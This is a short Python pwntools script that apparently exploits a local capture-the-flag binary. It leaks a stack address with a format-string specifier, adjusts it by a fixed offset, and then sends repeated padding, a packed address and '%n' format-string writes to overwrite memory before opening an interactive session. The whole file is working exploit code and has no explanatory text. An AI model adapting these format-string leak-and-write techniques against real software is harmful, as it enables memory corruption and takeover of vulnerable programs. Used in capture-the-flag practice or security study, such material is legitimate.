from pwn import *
# this is for local not remote but basically the same
p = process("./chal")

#p = gdb.debug("./chal", gdbscript='b box')

p.sendline("%15$p")

p.recvline()

sike = p.recv(80)
sike = sike[2:16]

#sike = sike[22:-4]
sike = sike.decode()
print(sike)
sike = int(sike, 16)
sike += 10700
#p.recv(80)

p.sendline(b"\xef\xbe\xad\xde"* 34 + p64(sike))

p.sendline(b"%2988x %39$n")

sike += 2
p.sendline(b"\xef\xbe\xad\xde"*34 + p64(sike))

p.sendline(b"%2988x %39$n")

p.interactive()
